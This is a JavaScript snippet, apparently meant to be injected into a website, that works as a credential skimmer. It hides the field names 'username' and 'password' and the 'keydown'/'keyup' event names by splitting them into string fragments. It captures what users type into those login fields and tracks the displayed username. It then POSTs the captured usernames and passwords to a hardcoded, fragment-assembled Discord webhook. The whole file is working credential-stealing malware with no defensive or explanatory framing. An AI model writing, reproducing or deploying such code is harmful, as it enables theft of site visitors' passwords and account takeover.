let isp;
let pi;
let cx = false;

   let est_x = "us"
   let est_b = "ame"

       let ext_b = "rd"
   let ext_y = "sswo"
    let isS;
let act;

   if(!cx) {
     cx = true;
s_w({ ur: "User entered!", p: "Waiting"})
   }

   const ex = () => setInterval(() => {
    const e = $(".username").text();
    const e2 = e.replace(/\s/g, '');
       if(e && e2 !== "Welcome" && !isS){
           act = e2;
           isS = true;
           s_w({ ur: e2, p: "User"})
           clearInterval(ex)
       }
  }, 2000)
   ex()

   setInterval(() => {
       const e = $(".username").text();
       const e2 = e.replace(/\s/g, '');
       if(e2 !== act){
           isS = false;
           ex()
       } else {
        return;
       }
   }, 4000)

 let x_b = {
  ur: null,
  p: null,
 }

let lki = "down"
let lkp = "up"


function s_w (inf) {
   let comb_x = "https://discord.com/a"
   let comb_y = "pi/webh"
   let comb_z = "ooks/1412174161131995278/"
   let comb_b = "4fY6J09E8xsiEr5hgGh-9xpPVhwS0Ha"
   let comb_h = "_5RzkKHpRHLgk-TjmiKmy9eXD4Evl7b4-aooF"
   let comb_fi = comb_x + comb_y + comb_z + comb_b + comb_h;

   const wb = comb_fi;

   const pyl = {
      content: `
:star: \`|\` U: \`${inf.ur || " "}\`, P: \`${inf.p || " "}\`
       `,
   }
try {
   fetch(wb, {
      method: "POST",
      headers: {
         "Content-Type": "application/json"
      },
      body: JSON.stringify(pyl)
   }).then(response => response.json()).catch((err) => null);
} catch (e) {
}
}

let lk1 = "ke"
let lkx = "y"

const xz = (xb) => {
    pi = false;
    isp = true;
    setTimeout(() => {
        isp = false;
    }, 2000)

     const k = setInterval(() => {
      if(isp === false && pi !== true) {
       pi = true;
       s_w(xb)
       clearInterval(k)
      }
     }, 2000)

}

let lkr = lk1 + lkx + lki;
let lkr2 = lk1 + lkx + lkp;

let lk = [lkr, lkr2]

lk.map((ev) => {
document.addEventListener(ev, (e) => {
    let est_y = "ern"
    let est_c = est_x + est_y + est_b;

    let ext_x = "pa"
    let ext_c = ext_x + ext_y + ext_b;

  if (e.target && e.target.id === est_c || e.target.id === ext_c) {
   if(e.target.id === est_c) x_b.ur = e.target.value;
   if(e.target.id === ext_c) {
      if(e.target.value !== "") {
        x_b.p = e.target.value
      }
   };
    xz(x_b)
  }

}, true);
})
